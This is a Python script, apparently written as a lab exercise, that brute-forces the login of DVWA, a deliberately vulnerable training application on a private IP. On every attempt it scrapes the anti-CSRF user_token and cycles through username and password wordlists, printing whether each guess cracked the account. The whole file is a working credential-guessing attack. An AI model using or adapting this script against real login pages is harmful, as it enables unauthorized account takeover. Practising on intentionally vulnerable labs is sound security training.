# -*- coding: utf-8 -*-
# author = 'K0ctr'


import requests
import re


ip = "192.168.203.128"
login_page = "http://%s/dvwa/login.php" % ip
r=requests.get(login_page)
login_token=re.findall(r"(?<=<input type='hidden' name='user_token' value=').+?(?=' />)", r.text)[0]

login_data = {
    "username":"admin",
    "password":'password',
    "Login":'Login',
    'user_token':login_token
}
r=requests.get(login_page,params=login_data)
print(r.url)
usernames = open("small.txt", 'r', encoding="utf-8")
passwords = open("common_pass.txt", 'r', encoding='utf-8')

for username in usernames:
    for password in passwords:
        url = "http://192.168.203.128/dvwa/vulnerabilities/brute/"
        r = requests.get(url)
        print(r.url)
        token = re.findall(r"(?<=<input type='hidden' name='user_token' value=').+?(?=' />)", r.text)[0]
        print(token)
        get_data = {
            "user_token": token,
            "username": username,
            "password": password,
            "Login": "Login"
        }
        print('-' * 20)
        print('用户名：', username)
        print('密码：', password)
        r = requests.get(url, params=get_data)
        print(r.url)
        if 'Username and/or password incorrect.' in r.text:
            print(1)
            print('破解失败')
        else:
            print('破解成功')
        print('-' * 20)

usernames.close()
passwords.close()
